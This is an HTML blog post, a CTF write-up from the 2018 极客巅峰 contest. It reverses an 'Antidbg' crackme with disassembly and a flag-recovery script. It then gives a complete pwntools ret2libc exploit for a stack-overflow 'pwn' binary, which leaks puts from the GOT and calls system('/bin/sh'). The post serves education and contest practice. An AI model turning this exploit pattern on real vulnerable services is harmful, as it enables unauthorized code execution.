@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>极客巅峰 | Tower</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="栗子下载https://github.com/tower111/software.gitAntidbg搜索字符串找不到关键点，也没有命名很明显的函数。找导入表看了一下，有GetMessageA函数，跟踪看一下。123456789101112void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)&amp;#123;  struct t">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客巅峰">
+<meta property="og:url" content="http://yoursite.com/2018/08/26/极客巅峰/index.html">
+<meta property="og:site_name" content="Tower">
+<meta property="og:description" content="栗子下载https://github.com/tower111/software.gitAntidbg搜索字符串找不到关键点，也没有命名很明显的函数。找导入表看了一下，有GetMessageA函数，跟踪看一下。123456789101112void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)&amp;#123;  struct t">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://i1.bvimg.com/659021/87fc10dd9dc850f6.png">
+<meta property="og:image" content="http://i2.bvimg.com/659021/728d456b90cb54a3.png">
+<meta property="og:updated_time" content="2018-08-26T09:32:21.106Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="极客巅峰">
+<meta name="twitter:description" content="栗子下载https://github.com/tower111/software.gitAntidbg搜索字符串找不到关键点，也没有命名很明显的函数。找导入表看了一下，有GetMessageA函数，跟踪看一下。123456789101112void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)&amp;#123;  struct t">
+<meta name="twitter:image" content="http://i1.bvimg.com/659021/87fc10dd9dc850f6.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <!-- <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'> -->
+  <!-- <link href="//fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css"> -->
+  <link href="//fonts.useso.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
+  <link href='//fonts.useso.com/css?family=Open+Sans:300,600' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <a href="/" class="logo">Tower</a>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about/index.html">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        </div>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        
+        
+          <a id="nav-github-link" class="nav-icon" href="https://tower111.github.io/" title="Fork me on GitHub"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <nav id="mobile-nav" class="off">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/index.html" class="mobile-nav-link">About</a>
+  
+  <div id="search-form-wrap-mobile">
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+  </div>
+</nav>
+      <div class="outer">
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/08/26/极客巅峰/">极客巅峰</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/">House Of Einherjar(2016 Seccon tinypad)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/通用gatget/">通用gatget</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/rop32/">rop32</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/free/">free</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/堆溢出-house-of-einherjar/" style="font-size: 10px;">堆溢出,house of einherjar</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">links</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://github.com/tower111/tower111.github.io.git">Hexo</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+        <section id="main"><article id="post-极客巅峰" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/26/极客巅峰/" class="article-date">
+  <time datetime="2018-08-26T08:34:12.000Z" itemprop="datePublished">2018-08-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      极客巅峰
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>栗子下载<a href="https://github.com/tower111/software.git" target="_blank" rel="noopener">https://github.com/tower111/software.git</a><br><strong>Antidbg</strong><br>搜索字符串找不到关键点，也没有命名很明显的函数。<br>找导入表看了一下，有GetMessageA函数，跟踪看一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)</span><br><span class="line">&#123;</span><br><span class="line">  struct tagMSG Msg; // [esp+8h] [ebp-20h]</span><br><span class="line"></span><br><span class="line">  CoInitialize(0);</span><br><span class="line">  SetWinEventHook(1u, 0x7FFFFFFFu, 0, pfnWinEventProc, 0, 0, 2u);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    GetMessageA(&amp;Msg, 0, 0, 0);</span><br><span class="line">    TranslateMessage(&amp;Msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里获取到了输入，具体输入是怎么用的，向上找。<br>定位到了这里<br><img src="http://i1.bvimg.com/659021/87fc10dd9dc850f6.png" alt="image0001"><br>创建了一个线程，然后进行一些操作。<br>不能反编译，看汇编吧，用od更一些。<br>载入之后发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:004011C0                 push    0               ; pvReserved</span><br><span class="line">.text:004011C2                 call    ds:CoInitialize</span><br><span class="line">.text:004011C8                 push    0               ; lpThreadId</span><br><span class="line">.text:004011CA                 push    0               ; dwCreationFlags</span><br><span class="line">.text:004011CC                 push    0               ; lpParameter</span><br><span class="line">.text:004011CE                 push    offset StartAddress ; lpStartAddress</span><br><span class="line">.text:004011D3                 push    0               ; dwStackSize</span><br><span class="line">.text:004011D5                 push    0               ; lpThreadAttributes</span><br><span class="line">.text:004011D7                 call    ds:CreateThread</span><br><span class="line">.text:004011DD                 push    32h</span><br><span class="line">.text:004011DF                 lea     eax, [ebp+Dst]</span><br><span class="line">.text:004011E2                 push    eax</span><br><span class="line">.text:004011E3                 push    offset unk_402128</span><br><span class="line">.text:004011E8                 call    sub_401050</span><br><span class="line">.text:004011ED                 lea     ecx, [ebp+Dst]</span><br><span class="line">.text:004011F0                 add     esp, 0Ch</span><br><span class="line">.text:004011F3                 lea     edx, [ecx+1]</span><br></pre></td></tr></table></figure></p>
+<p>sub_401050函数才是真正的scanf函数。好吧，这些都不重要，看算法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">009E11F6  |&gt; /8A01          /mov al,byte ptr ds:[ecx]</span><br><span class="line">009E11F8  |. |41            |inc ecx                                 ;  ucrtbase.77433041</span><br><span class="line">009E11F9  |. |84C0          |test al,al</span><br><span class="line">009E11FB  |.^\75 F9         \jnz short Antidbg.009E11F6              ;  lenstr</span><br><span class="line">009E11FD  |.  2BCA          sub ecx,edx</span><br><span class="line">009E11FF  |.  83F9 2A       cmp ecx,0x2A                             ;  len==42</span><br></pre></td></tr></table></figure></p>
+<p>求长度，len要=42.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">009E1202  |. /0F85 96000000 jnz Antidbg.009E129E</span><br><span class="line">009E1208  |. |0F2805 C0219E&gt;movaps xmm0,dqword ptr ds:[0x9E21C0]</span><br><span class="line">009E120F  |. |33D2          xor edx,edx</span><br><span class="line">009E1211  |. |0F1145 94     movups dqword ptr ss:[ebp-0x6C],xmm0</span><br><span class="line">009E1215  |. |C745 B4 02060&gt;mov [local.19],0x2080602</span><br><span class="line">009E121C  |. |0F2805 B0219E&gt;movaps xmm0,dqword ptr ds:[0x9E21B0]</span><br><span class="line">009E1223  |. |0F1145 A4     movups dqword ptr ss:[ebp-0x5C],xmm0</span><br><span class="line">009E1227  |. |C745 B8 09000&gt;mov [local.18],0x2050009</span><br><span class="line">009E122E  |. |66:C745 BC 02&gt;mov word ptr ss:[ebp-0x44],0xD02</span><br><span class="line">009E1234  |. |56            push esi                                 ;  ucrtbase.774FF0B0</span><br><span class="line">009E1235  |. |66            datasize:</span><br><span class="line">009E1236  |. |66            datasize:</span><br><span class="line">009E1237  |. |66:0f1f8400 0&gt;nop word ptr ds:[eax+eax]</span><br></pre></td></tr></table></figure></p>
+<p>这里进行了赋值，还有一些识别不出来的语句。重要的是赋值，是放到了栈里。一会再看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">009E1240  |&gt; /0FBE7415 C0   /movsx esi,byte ptr ss:[ebp+edx-0x40]    ;  str</span><br><span class="line">009E1245  |. |0FBE8A 78219E&gt;|movsx ecx,byte ptr ds:[edx+0x9E2178]    ;  byte_402178[i]</span><br><span class="line">009E124C  |. |8BC6          |mov eax,esi                             ;  ucrtbase.774FF0B0</span><br><span class="line">009E124E  |. |C1F8 04       |sar eax,0x4                             ;  qu str[i]的高位</span><br><span class="line">009E1251  |. |3B048D 18309E&gt;|cmp eax,dword ptr ds:[ecx*4+0x9E3018]   ;  6，小写字母·到o</span><br><span class="line">009E1258  |. |75 2A         |jnz short Antidbg.009E1284</span><br><span class="line">009E125A  |. |0FBE4415 94   |movsx eax,byte ptr ss:[ebp+edx-0x6C]    ;  1050D02070106010206000B07010C06h【-1】</span><br><span class="line">009E125F  |. |83E6 0F       |and esi,0xF                             ;  取str[i]低字节</span><br><span class="line">009E1262  |. |3B3485 38219E&gt;|cmp esi,dword ptr ds:[eax*4+0x9E2138]   ;  =eax</span><br><span class="line">009E1269  |. |75 19         |jnz short Antidbg.009E1284              ;  0x66=&apos;f&apos;</span><br><span class="line">009E126B  |. |42            |inc edx</span><br><span class="line">009E126C  |. |83FA 2A       |cmp edx,0x2A</span><br><span class="line">009E126F  |.^\7C CF         \jl short Antidbg.009E1240</span><br></pre></td></tr></table></figure>
+<p>这里进行了验证，一个字符的高4自己和低四字节分开比较。<br><img src="http://i2.bvimg.com/659021/728d456b90cb54a3.png" alt="image0001"><br>这里数据部分是0x02,0x03,0x06,0x07组成的数组。</p>
+<p>低4位取的是栈里面的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">010FFAB0   774FF0B0  ucrtbase.774FF0B0</span><br><span class="line">010FFAB4   07010C06</span><br><span class="line">010FFAB8   0206000B</span><br><span class="line">010FFABC   07010601</span><br><span class="line">010FFAC0   01050D02</span><br><span class="line">010FFAC4   040D0303</span><br><span class="line">010FFAC8   0D000103</span><br><span class="line">010FFACC   02010808</span><br><span class="line">010FFAD0   0100070D</span><br><span class="line">010FFAD4   02080602</span><br><span class="line">010FFAD8   02050009</span><br><span class="line">010FFADC   77410D02  ucrtbase.77410D02</span><br></pre></td></tr></table></figure></p>
+<p>注意最后的0x02,0x0d加上他们才能凑够42个字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">byte_402178=[  0x02, 0x02, 0x02, 0x02, 0x03, 0x01, 0x01, 0x02, 0x01, 0x01, </span><br><span class="line">  0x02, 0x01, 0x01, 0x00, 0x01, 0x01, 0x02, 0x02, 0x00, 0x01, </span><br><span class="line">  0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x02, 0x02, 0x00, 0x01, </span><br><span class="line">  0x01, 0x02, 0x02, 0x01, 0x01, 0x01, 0x01, 0x01, 0x02, 0x01, </span><br><span class="line">  0x01, 0x03]</span><br><span class="line">dword_403018=[2,3,6,7]#这里需要注意，数据是动态的，中间出错就有可能是它。</span><br><span class="line"></span><br><span class="line">key=[6, 12, 1, 7, 11, 0, 6, 2, 1, 6, 1, 7, 2, 13, 5, 1,</span><br><span class="line">	3, 3, 13, 4, 3, 1, 0, 13, 8, 8, 1, 2, 13, 7, 0, 1,</span><br><span class="line">	2, 6, 8, 2,9,0,5,2,2,0xd]</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">print key,len(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(0x2a):</span><br><span class="line">    h=dword_403018[byte_402178[i]]</span><br><span class="line">    l=key[i]</span><br><span class="line">    flag+=chr(h&lt;&lt;4|l)</span><br><span class="line">    print flag</span><br></pre></td></tr></table></figure>
+<p>总结：观察一些特殊函数找关键点。</p>
+<p>结合ida，某个数据如果不是定值，中间可能变化（od中跟出来的值在每一次循环中都可能变化）。</p>
+<hr>
+<p><strong>pwn</strong></p>
+<p>栈溢出漏洞，给了libc库，覆盖返回地址为puts函数，实现泄露。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">#p=remote(&quot;IP&quot;,port)</span><br><span class="line">#context.log_level=&quot;debug&quot;</span><br><span class="line">#libc=(&quot;libc-2.23.so&quot;)</span><br><span class="line">libc=ELF(&quot;libc.so.6&quot;)</span><br><span class="line">name_addr=0x0804A06C</span><br><span class="line">game_addr=0x080485CB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line">p.recvuntil(&quot;First, what&apos;s your name?\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;, do you want to get flag?&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;A&quot;*(0x1c+4)+p32(elf.plt[&quot;puts&quot;])+p32(game_addr)+p32(elf.got[&quot;puts&quot;]))</span><br><span class="line">p.recvline()</span><br><span class="line">data=p.recv(4)</span><br><span class="line">print hex(u32(data))</span><br><span class="line">puts_addr=u32(data)</span><br><span class="line">system_addr=puts_addr-libc.symbols[&quot;puts&quot;]+libc.symbols[&quot;system&quot;]</span><br><span class="line">print &quot;system_addr=&quot;+hex(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;First, what&apos;s your name?\n&quot;)</span><br><span class="line">p.sendline(&quot;//bin/sh\x00&quot;)</span><br><span class="line">p.recvuntil(&quot;, do you want to get flag?&quot;)</span><br><span class="line">p.sendline(&quot;A&quot;*(0x1c+4)+p32(system_addr)+p32(game_addr)+p32(name_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/08/26/极客巅峰/" data-id="cjlao8wm6000104l35oen456o" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">House Of Einherjar(2016 Seccon tinypad)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <a href="/" class="logo">Tower</a>
+      &copy; 2018 tower<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/jquery.scrollLoading.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
